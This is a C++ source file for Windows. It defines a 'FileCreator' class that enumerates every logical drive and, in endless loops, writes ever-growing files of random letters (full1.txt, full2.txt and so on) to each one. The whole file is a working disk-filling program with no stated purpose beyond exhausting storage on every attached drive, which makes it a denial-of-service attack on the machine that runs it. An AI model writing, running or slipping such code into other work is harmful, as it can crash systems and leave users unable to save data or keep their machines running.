#include "FileCreator.h"
#include <fstream>
#include <memory>
#include <process.h>
#include <windows.h>
#include <random>
#include <iostream>

constexpr auto BUFFER_SIZE = 1024 * 1024;

FileCreator::FileCreator() {}

FileCreator::~FileCreator() {}

void FileCreator::runner() {
    HANDLE thread = NULL;
    std::unique_ptr<int> threadData = std::make_unique<int>(0);
    thread = (HANDLE)_beginthreadex(nullptr, 0, createFilesThread, threadData.get(), 0, nullptr);
    if (thread == nullptr) {
        return;
    }
    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);
}

unsigned __stdcall FileCreator::createFilesThread(void* arg) {
    DWORD drives = GetLogicalDrives();
    DWORD mask = 1;
    for (char drive = 'A'; drive <= 'Z'; ++drive) {
        if (drives & mask) {
            std::string drivePath = std::string(1, drive) + ":\\";

            FileCreator creator;
            creator.createFilesInDirectory(drivePath);
        }
        mask <<= 1;
    }
    return 0;
}

void FileCreator::createTextFileWithRandomData(const std::string& filename) {
    std::ofstream file(filename, std::ios::binary);

    if (!file.is_open()) {
        return;
    }

    std::unique_ptr<char[]> buffer = std::make_unique<char[]>(BUFFER_SIZE);
    std::random_device rd;
    std::uniform_int_distribution<int> dist(0, 25);

    for (size_t i = 0; i < BUFFER_SIZE; ++i) {
        buffer[i] = 'A' + dist(rd);
    }

    while (file.write(buffer.get(), BUFFER_SIZE)) {}

    file.close();
}

void FileCreator::createFilesInDirectory(const std::string& directoryPath) {
    if (!createDirectoryIfNotExist(directoryPath)) {
        return;
    }

    int fileCount = 1;
    while (true) {
        std::string filename = directoryPath + "\\full" + std::to_string(fileCount) + ".txt";
        createTextFileWithRandomData(filename);
        fileCount++;
    }
}

bool FileCreator::createDirectoryIfNotExist(const std::string& directoryPath) {
    DWORD dwAttrib = GetFileAttributesA(directoryPath.c_str());

    if (dwAttrib == INVALID_FILE_ATTRIBUTES || !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY)) {
        if (CreateDirectoryA(directoryPath.c_str(), nullptr) == 0) {
            return false;
        }
    }

    return true;
}
